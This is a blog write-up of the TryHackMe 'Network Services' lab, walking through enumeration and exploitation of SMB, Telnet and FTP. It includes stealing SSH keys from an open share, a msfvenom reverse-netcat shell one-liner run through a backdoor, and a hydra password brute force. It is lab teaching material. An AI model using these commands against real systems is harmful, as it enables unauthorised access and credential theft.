---
title: Writeup for TryHackMe room - Network Services
author: 4n3i5v74
date: 2021-01-25 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, network, protocols]
pin: true
---

## [Network Services](https://tryhackme.com/room/networkservices){:target="_blank"}

This room contains info and methods to recon and enumerate `SMB`, `Telnet` and `FTP`


## SMB


### Task 2 - Understanding SMB

Use these links as references.
- [SMB definition](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol){:target="_blank"}


### Task 3 - Enumerating SMB

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [Enum4Linux Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-enum4linux){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn --top 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 19:41 IST
Nmap scan report for <ip>
Host is up, received user-set (0.17s latency).
Not shown: 997 closed ports
Reason: 997 resets
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds{% endraw %} {% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

If ports `139` and `445` are open, it can be checked for `smb enumeration`.
{% capture code %}{% raw %}enum4linux.pl -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
An output similar to below will be obtained.
{% capture code %}{% raw %}Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 29 05:14:19 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... <ip>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===================================================
|    Enumerating Workgroup/Domain on <ip>    |
 ===================================================
[+] Got domain/workgroup name: WORKGROUP

 ===========================================
|    Nbtstat Information for <ip>    |
 ===========================================
Looking up status of <ip>
	POLOSMB         <00> -         B <ACTIVE>  Workstation Service
	POLOSMB         <03> -         B <ACTIVE>  Messenger Service
	POLOSMB         <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================
|    Session Check on <ip>    |
 ====================================
[+] Server <ip> allows sessions using username '', password ''

 ==========================================
|    Getting domain SID for <ip>    |
 ==========================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =====================================
|    OS information on <ip>    |
 =====================================
Use of uninitialized value $os_info in concatenation (.) or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
[+] Got OS info for <ip> from smbclient:
[+] Got OS info for <ip> from srvinfo:
	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================
|    Users on <ip>    |
 ============================
Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 876.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 879.

Use of uninitialized value $users in print at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 892.
Use of uninitialized value $users in pattern match (m//) at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 894.

 ========================================
|    Share Enumeration on <ip>    |
 ========================================
WARNING: The "syslog" option is deprecated

	Sharename       Type      Comment
	---------       ----      -------
	netlogon        Disk      Network Logon Service
	profiles        Disk      Users profiles
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            POLOSMB

[+] Attempting to map shares on <ip>
//<ip>/netlogon	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//<ip>/profiles	Mapping: OK, Listing: OK
//<ip>/print$	Mapping: DENIED, Listing: N/A
//<ip>/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================
|    Password Policy Information for <ip>    |
 ===================================================
[E] Dependent program "polenum.py" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/


 =============================
|    Groups on <ip>    |
 =============================

[+] Getting builtin groups:
[+] Getting builtin group memberships:
[+] Getting local groups:
[+] Getting local group memberships:
[+] Getting domain groups:
[+] Getting domain group memberships:

 ======================================================================
|    Users on <ip> via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-434125608-3964652802-3194254534
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)
S-1-5-21-434125608-3964652802-3194254534-513 POLOSMB\None (Domain Group)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cactus (Local User)

 ============================================
|    Getting printer info for <ip>    |
 ============================================
No printers returned.

enum4linux complete on Mon Mar 29 05:15:13 2021
{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

SMB port `139` is used for internal windows-windows share.
SMB port `445` is used to access SMB over internet.


### Task 4 - Exploiting SMB

Use these links as references.
- [SMBclient Reference](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html){:target="_blank"}
- [SMBclient Reference](https://bigb0ss.medium.com/tip-smbclient-c5e1f40909d9){:target="_blank"}


Use `smbclient`, enumerate and get the flag.
{% capture code %}{% raw %}smbclient //<ip>/profiles -U Anonymous -p 445{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
{% capture code %}{% raw %}Enter WORKGROUP\Anonymous's password: <empty>
Try "help" to get a list of possible commands.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Check if there are any interesting files and download that.
{% capture code %}{% raw %}ls
get "<file>" smb_enum.txt
!cat smb_enum.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Since the user is allowed ssh to other server, check if there is any remnants of rsa/dsa keys.
{% capture code %}{% raw %}recurse ON
prompt ON
mget .ssh
  getting file \.ssh\id_rsa of size 1679 as id_rsa (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
  getting file \.ssh\id_rsa.pub of size 396 as id_rsa.pub (0.6 KiloBytes/sec) (average 1.5 KiloBytes/sec)
  NT_STATUS_ACCESS_DENIED opening remote file \.ssh\authorized_keys
exit{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Try to ssh using the downloaded rsa keys.
{% capture code %}{% raw %}ssh cactus@<ip>
ls
cat smb.txt
  <flag>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}


## Telnet


### Task 6 - Enumerating Telnet

Use these links as references.
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn --top-ports 1000 -T4 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}
An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-29 05:38 BST
Nmap scan report for ip-10-10-250-209.eu-west-1.compute.internal (10.10.250.209)
Host is up, received arp-response (0.0012s latency).
All 1000 scanned ports on ip-10-10-250-209.eu-west-1.compute.internal (10.10.250.209) are closed because of 1000 resets
MAC Address: 02:6C:82:A4:FA:3B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.74 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Since nmap scan doesnt show much in top ports and it gets slower with `-p-` option, it can be broken down to 1000 ports at a time and get the results.
{% capture code %}{% raw %}nmap -Pn -T4 -sS -p8001-9000 --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 22:19 IST
Nmap scan report for <ip>
Host is up, received user-set (0.17s latency).
Not shown: 999 closed ports
Reason: 999 resets
PORT     STATE    SERVICE       REASON
8012/tcp open     unknown       syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

A detailed analysis on open port will give more information we are looking for.
{% capture code %}{% raw %}nmap -Pn -p8012 -A --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-02 22:20 IST
Nmap scan report for <ip>
Host is up, received user-set (0.17s latency).

PORT     STATE SERVICE REASON         VERSION
8012/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC,   LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq,  TerminalServer, X11Probe:
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 34)     (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10(92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8012/tcp)
HOP RTT       ADDRESS
1   165.94 ms 10.14.0.1
2   166.39 ms <ip>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.24 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}


### Task 7 - Exploiting Telnet

Now that the port running `telnet` and more info on it is discovered, we can try to access it.
{% capture code %}{% raw %}telnet <ip> 8012{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Basic navigation can be done from `telnet` as below.
{% capture code %}{% raw %}Trying <ip>...
Connected to <ip>.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
.RUN ls{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Start a tcpdump listener locally in another session.
{% capture code %}{% raw %}tcpdump ip proto \\icmp -i <tun0|eth0>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

In the telnet session, try to ping local ip to see if connection can be established and commands can be executed.
{% capture code %}{% raw %}.RUN ping -c1 <local-ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

The ping packets can be seen in tcpdump listener session.
An output similar to below will be obtained.
{% capture code %}{% raw %}23:16:09.761762 IP <ip> > <hostname>: ICMP echo request, id 1017, seq 1, length 64
23:16:09.761827 IP <hostname> > <ip>: ICMP echo reply, id 1017, seq 1, length 64{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

A reverse shell payload can be generated using msfvenom and can be exploited from listening netcat session.
{% capture code %}{% raw %}msfvenom -p cmd/unix/reverse_netcat lhost=<local-ip> lport=4444 R{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

The basic options used in msfvenom.
- `-p` - payload
- `lhost` - local IP address
- `lport` - local port to listen
- `R` - export payload in raw format

An output similar to below will be obtained.
{% capture code %}{% raw %}[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 89 bytes
mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn | /bin/sh >/tmp/gqbn 2>&1 ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Use `netcat` to listen for reverse proxy connection in separate session.
{% capture code %}{% raw %}nc -lvp 4444{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

From the `telnet` session, initiate the reverse payload generated from `msfvenom`.
{% capture code %}{% raw %}.RUN mkfifo /tmp/gqbn; nc <local-ip> 4444 0</tmp/gqbn 2>&1 | /bin/sh >/tmp/gqbn ; rm /tmp/gqbn{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained in telnet listener session.
{% capture code %}{% raw %}listening on [any] 4444 ...
<ip>: inverse host lookup failed: Unknown host
connect to [<local-ip>] from (UNKNOWN) [<ip>] 51102{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Capture the flag.
{% capture code %}{% raw %}cat flag.txt
  <flag>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}


## FTP


### Task 7 - Understanding FTP

Use these links as references.
- [FTP Reference](https://www.ietf.org/rfc/rfc959.txt){:target="_blank"}


An active FTP connection is where the client opens a port and listens, and server is required to connect. A passive FTP connection is where server opens a port and client listens to it.


### Task 8 - Enumerating FTP

Use these links as references.
- [FTP Exploit](https://www.exploit-db.com/exploits/20745){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn -T4 -p 1-1000 -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-03 00:32 IST
Nmap scan report for <ip>
Host is up, received user-set (0.17s latency).
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Nmap done: 1 IP address (1 host up) scanned in 6.09 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Perform a detailed scan on FTP port to get more info.
{% capture code %}{% raw %}nmap -Pn -T4 -p21 -A -sS --reason <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.70 ( https://nmap.org ) at 2021-01-03 00:33 IST
Nmap scan report for <ip>
Host is up, received user-set (0.18s latency).

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to <ip>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%),AXIS    210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.18 (92%), Linux 3.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: Welcome

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   166.52 ms <gateway>
2   189.35 ms <ip>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

We can see anonymous login is enabled and the file which can be retrieved using the same.
{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Connected to <ip>.
220 Welcome to the administrator FTP service.
Name (<ip>:<user>): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Get the contents of file `PUBLIC_NOTICE.txt` to check if any useful information is available.
{% capture code %}{% raw %}ftp> pwd
  257 "/" is the current directory
ftp> ls
  200 PORT command successful. Consider using PASV.
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
  226 Directory send OK.
ftp> get "PUBLIC_NOTICE.txt"
  local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
  200 PORT command successful. Consider using PASV.
  150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
  226 Transfer complete.
  353 bytes received in 0.00 secs (137.7254 kB/s)
ftp> !cat PUBLIC_NOTICE.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}


### Task 10 - Exploiting FTP

Use these links as references.
- [Securing FTP](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [Install Hydra](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-hydra){:target="_blank"}
- [Wordlist Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists---rockyou){:target="_blank"}


Use `hydra` to exploit ftp.
{% capture code %}{% raw %}hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Hydra v9.2-dev (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal  purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-03 00:56:15
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://<ip>:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target <ip> - login "mike" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target <ip> - login "mike" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target <ip> - login "mike" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target <ip> - login "mike" - pass "password" - 4 of 14344399 [child 3] (0/0)
[21][ftp] host: <ip>   login: mike   password: password
[STATUS] attack finished for <ip> (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-03 00:56:22{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Since the password is exploited, we can try with `ftp` using the password.
{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Connected to <ip>.
220 Welcome to the administrator FTP service.
Name (<ip>:lab): mike
331 Please specify the password.
Password: password
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}

Capture the flag.
{% capture code %}{% raw %}ftp> ls
  200 PORT command successful. Consider using PASV.
  150 Here comes the directory listing.
  drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
  -rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
  226 Directory send OK.
ftp> get ftp.txt
  local: ftp.txt remote: ftp.txt
  200 PORT command successful. Consider using PASV.
  150 Opening BINARY mode data connection for ftp.txt (26 bytes).
  226 Transfer complete.
  26 bytes received in 0.00 secs (39.5493 kB/s)
ftp> !cat ftp.txt{% endraw %}{% endcapture %} {% include code.html code=code lang="console"%}


### Task 10 - Expanding knowledge

Use these links as references for further study on Network services.
- [Exploiting simple network services in ctfs](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef){:target="_blank"}
- [Mitre - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/){:target="_blank"}

